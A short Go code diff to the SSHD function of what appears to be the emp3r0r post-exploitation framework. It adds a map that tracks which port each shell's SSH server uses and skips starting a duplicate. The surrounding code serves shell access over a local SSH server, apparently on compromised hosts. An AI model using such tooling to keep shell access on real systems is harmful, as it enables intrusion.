@@ -17,6 +17,10 @@ import (
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 )
 
+// stores port mappings for ssh shells
+// shell: port
+var SSH_Shells = make(map[string]string)
+
 func setWinsize(f *os.File, w, h int) {
 	syscall.Syscall(syscall.SYS_IOCTL, f.Fd(), uintptr(syscall.TIOCSWINSZ),
 		uintptr(unsafe.Pointer(&struct{ h, w, x, y uint16 }{uint16(h), uint16(w), 0, 0})))
@@ -25,6 +29,11 @@ func setWinsize(f *os.File, w, h int) {
 // SSHD start a ssh server to provide shell access for clients
 // the server binds local interface only
 func SSHD(shell, port string, args []string) (err error) {
+	p, exists := SSH_Shells[shell]
+	if exists {
+		log.Printf("%s already serves on port %s", shell, p)
+		return
+	}
 	exe, err := exec.LookPath(shell)
 	if err != nil {
 		res := fmt.Sprintf("%s not found (%v), aborting", shell, err)
@@ -68,6 +77,10 @@ func SSHD(shell, port string, args []string) (err error) {
 		io.Copy(s, f) // stdout
 		cmd.Wait()
 	})
+
+	defer func() {
+		SSH_Shells[shell] = port
+	}()
 
 	log.Printf("Starting SSHD on port %s...", port)
 	return ssh.ListenAndServe("127.0.0.1:"+port, nil)
